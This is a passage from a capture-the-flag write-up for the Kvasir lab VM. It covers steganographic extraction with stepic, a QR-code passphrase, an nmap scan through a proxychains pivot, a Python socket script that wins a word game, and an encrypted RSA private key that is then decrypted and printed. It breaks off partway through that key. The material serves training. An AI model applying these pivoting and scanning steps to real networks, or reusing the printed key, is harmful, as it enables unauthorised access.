</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# pip install stepic
</span><span class='line'>Downloading/unpacking stepic
</span><span class='line'>  Downloading stepic-0.4%7ebzr.tar.gz
</span><span class='line'>  Running setup.py egg_info <span class="k">for </span>package stepic
</span><span class='line'>
</span><span class='line'>Installing collected packages: stepic
</span><span class='line'>  Running setup.py install <span class="k">for </span>stepic
</span><span class='line'>    changing mode of build/scripts-2.7/stepic from 644 to 755
</span><span class='line'>
</span><span class='line'>    changing mode of /root/kvasir/bin/stepic to 755
</span><span class='line'>Successfully installed stepic
</span><span class='line'>Cleaning up...
</span></code></pre></td></tr></table></div></figure>


<p>However, <code>stepic</code> was not just a case of plug and play for me. <strong>NOPE</strong>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# stepic
</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
</span><span class='line'>  File <span class="s2">&quot;/root/kvasir/bin/stepic&quot;</span>, line 24, in &lt;module&gt;
</span><span class='line'>    import Image
</span><span class='line'>ImportError: No module named Image
</span></code></pre></td></tr></table></div></figure>


<p>Long story short, a small hack and installation of another dependency finally got it working for me:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# pip install pillow
</span><span class='line'>Downloading/unpacking pillow
</span><span class='line'>  Downloading Pillow-2.6.1.tar.gz <span class="o">(</span>7.3Mb<span class="o">)</span>: 7.3Mb downloaded
</span><span class='line'>  Running setup.py egg_info <span class="k">for </span>package pillow
</span><span class='line'>    Single threaded build, not installing mp_compile: 1 processes
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>    *** OPENJPEG <span class="o">(</span>JPEG2000<span class="o">)</span> support not available
</span><span class='line'>    --- ZLIB <span class="o">(</span>PNG/ZIP<span class="o">)</span> support available
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Successfully installed pillow
</span><span class='line'>Cleaning up...
</span></code></pre></td></tr></table></div></figure>


<p>The final hack was to change the installed <code>stepic</code> bin at <code>/root/kvasir/bin/stepic</code> line 24 from <code>import Image</code> to <code>from PIL import Image</code>. Finally, <code>stepic</code> was working fine.</p>

<h3>finding the secret</h3>

<p>With <code>stepic</code> up and running, I was finally able to run it against the image <code>kvasir.png</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>kvasir<span class="o">)</span>root@kali:~# stepic --decode --image-in<span class="o">=</span>kvasir.png --out<span class="o">=</span>out
</span><span class='line'>
</span><span class='line'><span class="c"># check the file type we got out</span>
</span><span class='line'>root@kali:~# file out
</span><span class='line'>out: ASCII text, with very long lines, with no line terminators
</span><span class='line'>
</span><span class='line'><span class="c"># check the output we got</span>
</span><span class='line'>root@kali:~# cat out
</span><span class='line'>89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5
</span><span class='line'>445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec90544
</span><span class='line'>22304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be
</span><span class='line'>559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e
</span><span class='line'>7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e
</span><span class='line'>215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae5
</span><span class='line'>55e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d
</span><span class='line'>97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88
</span><span class='line'>df9bb4ae0a3dc20000000049454e44ae426082
</span></code></pre></td></tr></table></div></figure>


<p>At this stage I was pretty convinced my hacks to get <code>stepic</code> to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.</p>

<p>Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of <code>decode()</code> methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python
</span><span class='line'>Python 2.7.3 <span class="o">(</span>default, Mar 14 2014, 11:57:14<span class="o">)</span>
</span><span class='line'><span class="o">[</span>GCC 4.7.2<span class="o">]</span> on linux2
</span><span class='line'>Type <span class="s2">&quot;help&quot;</span>, <span class="s2">&quot;copyright&quot;</span>, <span class="s2">&quot;credits&quot;</span> or <span class="s2">&quot;license&quot;</span> <span class="k">for </span>more information.
</span><span class='line'>&gt;&gt;&gt; <span class="s2">&quot;89504e470d0a1a0a000000&quot;</span>.decode<span class="o">(</span><span class="s2">&quot;hex&quot;</span><span class="o">)</span>
</span><span class='line'><span class="s1">&#39;\x89PNG\r\n\x1a\n\x00\x00\x00&#39;</span>
</span><span class='line'>&gt;&gt;&gt;
</span></code></pre></td></tr></table></div></figure>


<p>Decoding it as <code>hex</code> revealed the part I needed to see&hellip; <code>PNG</code>! So this string was a hex encoded PNG image (unless thats a troll too&hellip;). I took <code>out</code> and reversed it using <code>xxd -r -p</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# xxd -p -r out &gt; kvasir2.png
</span><span class='line'>root@kali:~# file kvasir2.png
</span><span class='line'>kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
</span></code></pre></td></tr></table></div></figure>


<p>Lets see what the image looks like:</p>

<p><img src="https://i.imgur.com/r0wxCYh.png"></p>

<p>A QR code! I fetched my phone and scanned it, revealing the string <code>Nk9yY31hva8q</code>. Great!&hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for <code>dev1</code> either.</p>

<h2>playing Terra&rsquo;s game</h2>

<p>Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&rsquo;s game as per the email. From the <code>/etc/hosts</code> on <code>db</code>, I saw a comment for <code>terra</code> as <strong>192.168.3.50</strong>. Using the SSH socks proxy on <code>tcp/8000</code> I setup when I setup the SSH session to <strong>192.168.2.200</strong>, I nmapped <strong>192.168.3.50</strong>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># /etc/proxychains.conf has line</span>
</span><span class='line'><span class="c"># socks5    127.0.0.1 8000</span>
</span><span class='line'>
</span><span class='line'><span class="c"># scans will appear to be coming from 192.168.3.200 for</span>
</span><span class='line'><span class="c"># 192.168.3.50</span>
</span><span class='line'>root@kali:~# proxychains nmap -sT 192.168.3.50
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-11-09 16:31 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.3.50
</span><span class='line'>Host is up <span class="o">(</span>0.0012s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 998 closed ports
</span><span class='line'>PORT     STATE SERVICE
</span><span class='line'>22/tcp   open  ssh
</span><span class='line'>4444/tcp open  krb524
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 1.47 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Well <code>tcp/4444</code> looks interesting! Lets have a look!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains nc 192.168.3.50 4444
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'>Hello Celes <span class="p">&amp;</span> Welcome to the Jumble!
</span><span class='line'>
</span><span class='line'>Solve:indrssoses
</span><span class='line'>Solve:roneb bob
</span><span class='line'>Solve:abaerrbs
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Solve:iepasncm
</span><span class='line'>
</span><span class='line'>Score: 0
</span><span class='line'>Time: 22.71 secs
</span><span class='line'>Just a bit embarrasing really...
</span></code></pre></td></tr></table></div></figure>


<p>Don&rsquo;t think I did too well there! :D Not to fear. I recognized some of the strings after the <em>Solve:</em> as ones that are scrambled from the previously found <code>.words.txt</code> file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from <code>.words.txt</code>. With the <code>.words.txt</code> file locally available, I slapped together something to try and do this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="c"># Kvasir Terra Puzzle Solver</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">base64</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read the words.txt we got into a list</span>
</span><span class='line'><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;words.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>    <span class="n">words</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="c"># connection to the game</span>
</span><span class='line'><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;192.168.3.50&#39;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start processing the lines</span>
</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># receive a frame large enough</span>
</span><span class='line'>    <span class="n">frame</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">150</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># check that its a question frame</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Solve&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">frame</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[!] &#39;Solve&#39; not in frame. Game over?&quot;</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># split the frame with :</span>
</span><span class='line'>    <span class="n">frame</span> <span class="o">=</span> <span class="n">frame</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[!] Was unable to split by :. Game over?&quot;</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">question</span> <span class="o">=</span> <span class="n">frame</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># @barrebas suggested a length check too to increase probability :)</span>
</span><span class='line'>    <span class="n">result</span> <span class="o">=</span> <span class="p">[</span><span class="n">s</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">words</span> <span class="k">if</span> <span class="ow">not</span> <span class="n">s</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="n">question</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">question</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)]</span>
</span><span class='line'>    <span class="c">#result = [s for s in words if not s.strip(question)]</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[!] Was unable to match anything to </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">question</span>
</span><span class='line'>        <span class="k">continue</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">answer</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Matched </span><span class="si">%s</span><span class="s"> to </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">question</span><span class="p">,</span> <span class="n">answer</span><span class="p">)</span>
</span><span class='line'>    <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># did we win? \:D/</span>
</span><span class='line'><span class="k">if</span> <span class="s">&#39;You</span><span class="se">\&#39;</span><span class="s">re a winner&#39;</span> <span class="ow">in</span> <span class="n">frame</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] We won!&quot;</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># read the rest of the socket output</span>
</span><span class='line'>    <span class="n">frame</span> <span class="o">+=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2500</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># base64 decode the last string</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Extracing and decoding the base64 section&quot;</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">sock</span><span class="o">.</span><span class="n">close</span>
</span><span class='line'>
</span><span class='line'><span class="c"># work with what we have left</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Last frame was:</span><span class="se">\n</span><span class="s"> </span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">frame</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] Done&quot;</span>
</span><span class='line'><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the <code>base64.b64decode(frame.split('\n')[-1])</code> section to the script so that if you win it will print the cleartext version.</p>

<p>The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ./play.py
</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched atravdeii to radiative
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched oilyaerbdmpn to imponderably
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched idmlhkeir to kriemhild
</span><span class='line'><span class="o">[</span>!<span class="o">]</span> <span class="s1">&#39;Solve&#39;</span> not in frame. Game over?
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> We won!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Extracing and decoding the base64 section
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>Proc-Type: 4,ENCRYPTED
</span><span class='line'>DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D
</span><span class='line'>
</span><span class='line'>OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
</span><span class='line'>So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
</span><span class='line'>Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
</span><span class='line'>J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
</span><span class='line'>P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
</span><span class='line'>jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
</span><span class='line'>9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
</span><span class='line'>hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
</span><span class='line'>Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
</span><span class='line'>oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
</span><span class='line'>0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
</span><span class='line'>q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
</span><span class='line'>cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
</span><span class='line'>X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
</span><span class='line'>MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
</span><span class='line'>gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
</span><span class='line'>N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
</span><span class='line'>izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
</span><span class='line'>Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
</span><span class='line'>uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
</span><span class='line'>PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
</span><span class='line'>RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
</span><span class='line'>4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
</span><span class='line'>DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
</span><span class='line'>JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span></code></pre></td></tr></table></div></figure>


<p>A private key? Encrypted though :( Remembering the string I got from the QR code earlier that had no affiliation to anything yet, I tried that as the password to decrypt:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:# openssl rsa -in terra_key -out terra_key_nopass
</span><span class='line'>Enter pass phrase <span class="k">for </span>terra_key: <span class="c"># entered Nk9yY31hva8q</span>
</span><span class='line'>writing RSA key
</span><span class='line'>
</span><span class='line'>root@kali:~# cat terra_key_nopass
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpAIBAAKCAQEAyekXwhcscSSzT3vw5/eL2h1Bb55vEIOOAkQpIQQ/ldnyT6Yt
</span><span class='line'>w0dAaN71JidjfojzvdaZRNrRY5wkdHUr2t93TJx8vKDZ+n5up4nCKle3p2sz2hKP
</span><span class='line'>DhP7LvxkVTM7Io3qoAYXefggTOWvfoK8X8pXE3xAdIyF4uCXmDjeg6UKoCr5XiWP
</span><span class='line'>12YQEODLd+tp9RH4R/rCaencsNsta45sY1NXtWuJje4HVkPV8ei04ce8SP5PwVhV
</span><span class='line'>sfp2Hxr8g4IKn7ZTwtmkD1SuvmZoyDHNAsToqFt2RiVE9yLQj94Gcagx7PqUijeH
</span><span class='line'>b+4T+6tuDZtjgct4RdYZejnUOYx+iHiSjl6xCQIDAQABAoIBADYOi+fQ4HsiQkeD
</span><span class='line'>fUn9gpnQv1Ys6rtXHUwKB6DpTETIZxFgAlyH1Py+xI+EeCTGcctfiwVeODUc9r2f
</span><span class='line'>KTCeJ4iBVPwDbJieBO4h+bPwbCEMmINH+LjiLJu1wv70il6D9E8Hkn17Ktqrm8KZ
</span><span class='line'>KenTeGClIXSSsr29N5jvkNNZ+nBK116l2TNNSsiWGc3VnezgCuRnDMSuKmA4P/OD
</span><span class='line'>5F/h2/1sC33P1P5zxSMMsUZbm616AXNdv2DxHYm5b7p0L3/wzpZaJ+ZCp9jutbMO
</span><span class='line'>P7XADZrFSn1EOk9blfVQz77GhRUVAotXKv7Jj4x+zHjq2l3n2Jk5RwJLl8iw4vZ+
</span><span class='line'>ActgrskCgYEA5RhweA1naUanRJtlnLY4ywjfpZffPOZovmthqeOYdSJmwdmKvf08
